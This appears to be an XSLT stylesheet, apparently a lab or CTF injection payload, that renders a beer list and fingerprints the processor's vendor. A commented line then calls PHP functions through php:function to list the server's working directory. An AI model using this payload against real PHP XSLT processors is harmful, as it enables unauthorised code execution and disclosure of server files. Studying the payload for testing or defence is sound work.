<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
  <xsl:output method="html" encoding="UTF-8" indent="yes" />
  <xsl:template match="/">
    <html>
      <body style="font-family:Arial;font-size:10pt;background-color:#EEFFAA">
        <xsl:for-each select="beers/beer">
          <div style="background-color:teal;color:white;padding:4px">
            <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
            <xsl:value-of select="price"/>
          </div>
          <div style="margin-left:20px;margin-bottom:1em;font-size:12pt">
            <p>
              <xsl:value-of select="description"/>
              <span style="font-style:bold"> (<xsl:value-of select="prct"/> %)</span>
            </p>
          </div>
        </xsl:for-each>
        <div>
          <p>XSL Version: <xsl:value-of select="system-property('xsl:version')"/></p>
          <p>Vendor: <xsl:value-of select="system-property('xsl:vendor')"/></p>
          <p>Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')"/></p>
        </div>
        <!-- Ligne réintégrée pour exécuter la commande système -->
	<xsl:value-of select="php:function('print_r', php:function('scandir', '.'))"/>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
